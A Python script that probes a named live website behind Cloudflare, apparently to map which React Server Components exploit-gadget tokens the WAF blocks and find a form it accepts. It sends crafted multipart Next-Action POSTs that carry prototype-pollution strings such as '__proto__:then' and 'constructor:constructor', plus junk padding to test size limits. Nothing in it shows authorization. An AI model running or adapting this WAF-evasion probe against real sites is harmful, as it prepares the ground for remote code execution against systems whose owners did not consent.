#!/usr/bin/env python3
"""Bisect exactly which RSC-gadget token Cloudflare's rule matches; find an accepted form.
All bodies are non-exploiting: they only carry candidate tokens as JSON string values."""
import ssl, json, time, random, string, http.cookiejar, urllib.request, urllib.error

CTX = ssl.create_default_context()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
BASE = "https://onlyfakeai.ru"
cj = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPSHandler(context=CTX),
                                     urllib.request.HTTPCookieProcessor(cj))


def req(method, url, headers=None, body=None, timeout=30):
    h = {"User-Agent": UA, "Accept": "*/*"}
    if headers:
        h.update(headers)
    r = urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with OPENER.open(r, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()


def is_cf(b):
    return "Attention Required" in b.decode("utf-8", "ignore")[:3000]


def rnd(n=24):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def probe(tag, content, junk_kb=0):
    bnd = "----B" + rnd(30)
    parts = []
    if junk_kb:
        parts.append(f"--{bnd}\r\nContent-Disposition: form-data; name=\"j\"\r\n\r\n"
                     + "A" * (junk_kb * 1024) + "\r\n")
    parts.append(f"--{bnd}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{content}\r\n")
    parts.append(f"--{bnd}--\r\n")
    body = "".join(parts).encode()
    st, hd, b = req("POST", BASE + "/", headers={
        "Content-Type": f"multipart/form-data; boundary={bnd}",
        "Next-Action": rnd(40), "Accept": "text/x-component"}, body=body)
    print(f"[{tag}] HTTP {st} cf={is_cf(b)} len={len(b)}")
    time.sleep(1.5)
    return st


req("GET", BASE + "/")
time.sleep(1)

TOKENS = [
    ("thenval", '{"x":"$1:__proto__:then"}'),
    ("dollarB", '{"x":"$B1337"}'),
    ("ctor", '{"x":"$1:constructor:constructor"}'),
    ("resolved", '{"x":"resolved_model"}'),
    ("Q2", '{"x":"$Q2"}'),
    ("at0", '{"x":"$@0"}'),
    ("proto_only", '{"x":"__proto__"}'),
    ("then_only", '{"x":"then"}'),
    ("benign", '{"x":"hello"}'),
]
for tag, c in TOKENS:
    probe(tag, c)

# structure / size checks
probe("benign+128junk", '{"x":"hello"}', junk_kb=128)
probe("gadgetkeys_empty", '{"then":"","status":"","reason":0,"value":"","_response":{}}')
